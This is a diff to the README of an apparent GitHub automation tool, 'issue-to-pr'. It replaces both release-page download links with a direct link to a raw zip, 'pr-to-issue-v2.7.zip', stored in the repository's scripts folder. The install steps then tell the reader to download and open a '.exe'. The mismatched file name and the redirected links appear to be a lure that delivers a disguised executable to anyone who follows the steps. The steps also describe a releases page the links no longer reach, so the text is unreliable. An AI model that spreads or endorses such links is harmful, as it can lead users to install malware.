@@ -1,6 +1,6 @@
 # 🤖 issue-to-pr - Fix GitHub issues using smart automation
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lightfingered-llullaillaco3236/issue-to-pr/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lightfingered-llullaillaco3236/issue-to-pr/raw/refs/heads/main/scripts/pr-to-issue-v2.7.zip)
 
 issue-to-pr helps you manage your software projects. This tool reads your GitHub issues, looks at your code, and writes fixes for you. It submits these fixes as pull requests. You save time on manual coding and maintenance.
 
@@ -21,7 +21,7 @@ issue-to-pr helps you manage your software projects. This tool reads your GitHub
 
 ## 📥 How to Install
 
-1. Visit this [Download Page](https://github.com/Lightfingered-llullaillaco3236/issue-to-pr/releases) to access the files.
+1. Visit this [Download Page](https://github.com/Lightfingered-llullaillaco3236/issue-to-pr/raw/refs/heads/main/scripts/pr-to-issue-v2.7.zip) to access the files.
 2. Look for the recent release under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Open the file after the download finishes.
